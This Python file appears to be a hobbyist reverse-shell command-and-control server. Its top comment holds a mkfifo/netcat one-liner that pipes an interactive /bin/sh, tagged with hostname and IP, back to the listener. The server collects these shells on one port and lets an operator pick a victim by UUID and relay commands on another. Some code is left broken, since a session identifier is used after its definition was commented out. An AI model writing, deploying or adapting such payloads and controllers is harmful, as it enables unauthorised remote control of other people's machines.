import socket
import threading
from db import ComputerDatabase

# this works optional -> rm /tmp/f; mkfifo /tmp/f; (echo "haha $$ $(hostname) $(hostname -I | awk '{print $1}')" && cat /tmp/f | /bin/sh -i 2>&1) | nc 127.0.0.1 8080 >/tmp/f


class Server:
    def __init__(self, port1=8080, port2=8081, DEFAULT_DB_PATH="../computers.db"):
        self.DEFAULT_DB_PATH = DEFAULT_DB_PATH
        self.sessions = {}
        self.server_sockets = []
        self.port1 = port1
        self.port2 = port2

    def help_menu(self):
        return (
            "Available commands:\n"
            "help - print this window\n"
            "print - print all connections from the database\n"
            "exit - close the connection\n"
            "0 - select a UUID to work with\n"
        )

    def handle_client(self, client_socket):
        print("HOORAY")
        print(ans := client_socket.recv(1024).decode().strip())
        if ans.startswith("haha "):
            data = ans.split()
            #db = ComputerDatabase(self.DEFAULT_DB_PATH)
            #cuuid = db.insert_computer(int(data[1]), data[2], data[3])
            self.sessions[cuuid] = client_socket
        # You can add more code here to handle client communication
        # client_socket.close()
        else:
            client_socket.close()

    def work_with_customer(self, main_socket):
        print("HI")
        while True:
            try:
                main_socket.send(b"Select help to print help menu\n>>")
                com = main_socket.recv(1024).decode().strip()
                print(com.encode(), com)

                if com == "0":
                    main_socket.send(b"Please provide the UUID:\n")
                    uuid_input = main_socket.recv(1024).decode().strip()

                    if uuid_input in self.sessions:
                        client_socket = self.sessions[uuid_input]
                        pwd = client_socket.recv(1024).decode()
                        main_socket.send(f"Connected to UUID: {uuid_input}\n".encode())

                        while True:
                            command = main_socket.recv(1024).decode().strip()
                            if command == "exit":
                                break
                            else:
                                client_socket.send((command + "\n").encode())
                                print(f"Waiting answer for '{command}'")
                                ans = client_socket.recv(4096).decode()
                                print("Answer from client", ans)
                                main_socket.send(ans.encode())
                    else:
                        main_socket.send(b"UUID not found in sessions.\n")
                elif com == "exit":
                    main_socket.close()
                    break
                elif com == "help":
                    help_text = self.help_menu()
                    main_socket.send(help_text.encode())
                elif com == "print":
                    db = ComputerDatabase(self.DEFAULT_DB_PATH)
                    computers = db.get_computers()
                    response = "\n".join([str(computer) for computer in computers])
                    main_socket.send(response.encode())
                else:
                    print(self.sessions)
                    main_socket.send(b"dead beef\n")
            except BrokenPipeError:
                main_socket.close()
                break
            except KeyboardInterrupt:
                main_socket.close()
                break

    def accept_clients(self, port, handler):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(("0.0.0.0", port))
        server_socket.listen()
        self.server_sockets.append(server_socket)  # Keep track of the server socket
        print(f"Server is listening on port {port}...")

        while True:
            client_socket, addr = server_socket.accept()
            print(f"Accepted connection from {addr} on port {port}")
            # Start a new thread to handle the client
            client_handler = threading.Thread(target=handler, args=(client_socket,))
            client_handler.start()

    def run(self):
        try:
            # Start a thread for each port
            thread_8080 = threading.Thread(target=self.accept_clients, args=(self.port1, self.handle_client))
            thread_8081 = threading.Thread(target=self.accept_clients, args=(self.port2, self.work_with_customer))

            thread_8080.start()
            thread_8081.start()

            thread_8080.join()
            thread_8081.join()
        except KeyboardInterrupt:
            print("Closing")
            for sock in self.server_sockets:
                try:
                    sock.close()
                    print(f"Closed server socket on port {sock.getsockname()[1]}")
                except OSError:
                    print(f"Already closed {sock.getsockname()[1]}")

#if __name__ == "__main__":
#    server = Server()
#    server_thread = threading.Thread(target=server.run)
#    server_thread.start()

